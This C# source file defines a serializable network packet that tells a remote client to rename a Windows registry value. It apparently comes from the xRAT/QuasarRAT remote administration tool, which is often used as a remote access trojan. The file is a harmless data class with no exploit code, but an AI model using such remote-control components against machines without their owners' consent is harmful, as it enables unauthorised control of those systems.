using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoRenameRegistryValue : IPacket
    {
        public string KeyPath { get; set; }
        public string OldValueName { get; set; }
        public string NewValueName { get; set; }

        public DoRenameRegistryValue(string keyPath, string oldValueName, string newValueName)
        {
            KeyPath = keyPath;
            OldValueName = oldValueName;
            NewValueName = newValueName;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
